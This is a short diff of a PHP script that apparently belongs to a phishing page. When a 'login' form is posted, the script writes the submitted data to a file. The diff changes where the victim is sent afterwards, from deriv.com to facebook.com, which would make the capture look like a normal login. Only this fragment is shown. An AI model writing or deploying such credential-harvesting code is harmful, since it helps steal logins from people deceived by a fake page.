@@ -23,5 +23,5 @@ if (isset($_POST['login'])) {
 	fwrite($save,$body);
 	fclose($save);
 }
-header("Location: https://deriv.com");
+header("Location: https://www.facebook.com");
 ?>
